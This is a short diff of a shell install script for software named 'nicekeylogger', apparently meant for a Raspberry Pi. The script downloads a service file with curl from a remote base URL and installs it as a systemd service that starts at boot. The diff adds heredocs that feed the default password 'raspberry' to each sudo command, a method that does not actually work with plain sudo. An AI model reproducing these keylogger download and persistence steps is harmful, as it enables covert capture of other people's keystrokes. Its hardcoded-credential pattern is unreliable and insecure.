@@ -33,12 +33,20 @@ fi
 if ! test -f "$KLSERV" ; then
   curl $base\nicekeylogger.service > nicekeylogger.service
 fi
-sudo chmod 744 test/controller.py
+sudo chmod 744 test/controller.py <<!
+raspberry
+!
 
 # SET APPLICATION AS A SERVICE WITH SYSTEMD
-sudo mv nicekeylogger.service /etc/systemd/system/
-systemctl enable nicekeylogger.service
-systemctl daemon-reload
+sudo mv nicekeylogger.service /etc/systemd/system/ <<!
+raspberry
+!
+sudo systemctl enable nicekeylogger.service <<!
+raspberry
+!
+sudo systemctl daemon-reload <<!
+raspberry
+!
 
 
 # RUN APPLICATION
